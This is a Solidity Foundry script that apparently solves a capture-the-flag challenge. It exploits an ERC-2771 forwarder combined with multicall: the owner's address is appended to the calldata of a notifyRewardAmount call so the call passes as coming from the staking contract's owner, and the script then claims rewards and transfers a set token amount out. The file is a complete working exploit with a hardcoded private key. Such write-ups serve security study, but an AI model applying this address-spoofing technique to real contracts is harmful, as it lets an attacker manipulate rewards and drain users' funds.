// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

import {Challenge} from "src/Challenge.sol";
import {Token} from "src/Token.sol";
import {Forwarder} from "src/Forwarder.sol";
import {Staking} from "src/Staking.sol";

contract SolveScript is Script {
    Challenge challenge = Challenge(0x61F4D86184c89337514b598F4491d7048865a96e);
    Forwarder forwarder = challenge.forwarder();
    Staking staking = challenge.staking();
    Token stakingToken = staking.stakingToken();
    Token rewardToken = staking.rewardsToken();

    bytes32 constant _FORWARDREQUEST_TYPEHASH = keccak256(
        "ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint256 deadline,bytes data)"
    );
    uint256 pk = 0x52ad7c73f5e92539a453fcbb409c28cdccaf921743acc4de5f135315323fee83;
    uint256 amazingNumber = 1128120030438127299645800;

    function run() public {
        vm.startBroadcast();

        stakingToken.approve(address(staking), 100 * 10 ** 18);
        staking.stake(100 * 10 ** 18);

        uint256 amount = rewardToken.balanceOf(address(staking)) / 20;
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodePacked(abi.encodeWithSignature("notifyRewardAmount(uint256)", amount), staking.owner());
        bytes memory multicallData = abi.encodeWithSignature("multicall(bytes[])", data);
        Forwarder.ForwardRequest memory request = Forwarder.ForwardRequest({
            from: msg.sender,
            to: address(staking),
            value: 0,
            gas: 100000,
            nonce: forwarder.getNonce(msg.sender),
            deadline: 0,
            data: multicallData
        });
        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(pk, getTypedDataHash(forwarder.DOMAIN_SEPARATOR(), getStructHash(request)));
        bytes memory signature = abi.encodePacked(r, s, v);
        forwarder.execute(request, signature);

        vm.stopBroadcast();
    }

    function finalize() public {
        vm.startBroadcast();
        staking.getReward();
        rewardToken.transfer(address(0x123), amazingNumber);
        vm.stopBroadcast();
    }

    function getStructHash(Forwarder.ForwardRequest memory request) internal pure returns (bytes32) {
        return keccak256(
            abi.encode(
                _FORWARDREQUEST_TYPEHASH,
                request.from,
                request.to,
                request.value,
                request.gas,
                request.nonce,
                request.deadline,
                keccak256(request.data)
            )
        );
    }

    function getTypedDataHash(bytes32 domainSeparator, bytes32 structHash) public view returns (bytes32) {
        return keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    }
}
